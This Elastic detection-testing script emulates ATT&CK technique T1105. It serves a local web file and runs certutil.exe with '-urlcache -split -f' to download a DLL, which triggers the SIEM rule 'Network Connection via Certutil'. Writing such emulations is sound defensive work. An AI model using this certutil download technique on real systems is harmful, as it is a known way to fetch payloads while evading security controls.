# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: Downloading Files With Certutil
# RTA: certutil_webrequest.py
# ATT&CK: T1105
# Description: Uses certutil.exe to download a file.

from . import _common
from . import RtaMetadata


metadata = RtaMetadata(
    id="10609a63-0013-4fd0-9322-66c86c1c9501",
    platforms=["windows"],
    endpoint_rules=[],
    siem_rules=[{"rule_id": "3838e0e3-1850-4850-a411-2e8c5ba40ba8", "rule_name": "Network Connection via Certutil"}],
    techniques=["T1105"],
)


MY_DLL = _common.get_path("bin", "mydll.dll")


@_common.requires_os(*metadata.platforms)
@_common.dependencies(MY_DLL)
def main():
    # http server will terminate on main thread exit
    # if daemon is True
    server, ip, port = _common.serve_web()

    uri = "bin/mydll.dll"
    target_file = "mydll.dll"
    _common.clear_web_cache()
    url = "http://{ip}:{port}/{uri}".format(ip=ip, port=port, uri=uri)
    _common.execute(["certutil.exe", "-urlcache", "-split", "-f", url, target_file])

    server.shutdown()
    _common.remove_file(target_file)


if __name__ == "__main__":
    exit(main())
